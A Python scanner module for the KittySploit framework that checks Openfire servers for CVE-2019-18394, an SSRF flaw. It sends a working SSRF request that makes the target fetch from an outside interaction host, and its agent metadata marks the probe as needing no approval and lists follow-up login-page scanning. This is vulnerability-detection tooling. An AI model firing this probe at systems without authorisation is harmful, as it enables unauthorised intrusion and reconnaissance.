#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ignite Realtime Openfire through version 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ignite Realtime Openfire <=4.4.2 - Server-Side Request Forgery Detection',
        'description': 'Ignite Realtime Openfire through version 4.4.2 allows attackers to send arbitrary HTTP GET requests in FaviconServlet.java, resulting in server-side request forgery.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'ssrf', 'openfire', 'oast', 'igniterealtime', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://swarm.ptsecurity.com/openfire-admin-console/',
            'https://github.com/igniterealtime/Openfire/pull/1497',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-18394',
        ],
        'cve': 'CVE-2019-18394',
    }

    def run(self):
        r = self.http_request(method="GET", path='/getFavicon?host=oast.fun?', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Interactsh Server', 'image/x-icon',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="Ignite Realtime Openfire <=4.4.2 - Server-Side Request Forgery detected",
                path='/getFavicon?host=oast.fun?',
            )
            return True
        return False

